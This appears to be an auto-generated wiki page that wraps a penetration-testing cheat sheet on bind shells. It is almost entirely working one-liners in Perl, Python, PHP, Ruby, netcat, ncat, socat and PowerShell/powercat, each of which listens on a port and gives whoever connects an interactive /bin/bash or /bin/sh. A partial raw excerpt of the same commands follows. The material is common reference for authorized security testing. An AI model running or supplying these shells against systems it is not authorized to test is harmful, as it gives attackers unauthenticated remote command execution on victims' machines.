---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Bind Shell

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cheatsheets-shell-bind-cheatsheet` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cheatsheets/shell-bind-cheatsheet.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Bind Shell

## Preserved Body

````markdown
## Perl

```perl
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

## Python

Single line :

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Expanded version :

```python
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("0.0.0.0", 51337));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())
```

## PHP

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```

## Ruby

```ruby
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

## Netcat Traditional

```powershell
nc -nlvp 51337 -e /bin/bash
```

## Netcat OpenBsd

```powershell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```

## Ncat

```powershell
ncat -nlvp 51337 -e /bin/bash
```

## Socat

```powershell
user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Powershell

```powershell
https://github.com/besimorhino/powercat

# Victim (listen)
. .\powercat.ps1
powercat -l -p 7002 -ep

# Connect from attacker
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
```
````

## Source Verification

[source record](../../sources/internalallthethings/bind-shell.md)

## Evidence Excerpt

````text
_body: "# Bind Shell\n\n## Summary\n\n* [Bind Shell](#bind-shell)\n    * [Perl](#perl)\n    * [Python](#python)\n    * [PHP](#php)\n\
\    * [Ruby](#ruby)\n    * [Netcat Traditional](#netcat-traditional)\n    * [Netcat OpenBsd](#netcat-openbsd)\n    * [Ncat](#ncat)\n\
\    * [Socat](#socat)\n    * [Powershell](#powershell)\n\n## Perl\n\n```perl\nperl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"\
tcp\"));\\\nbind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\\nclose C){open(STDIN,\">&C\"\
);open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};'\n```\n\n## Python\n\nSingle line :\n\n```python\n\
python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,\
\ 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\
\"\")'\n```\n\nExpanded version :\n\n```python\nimport socket as s,subprocess as sp;\n\ns1 = s.socket(s.AF_INET, s.SOCK_STREAM);\n\
````
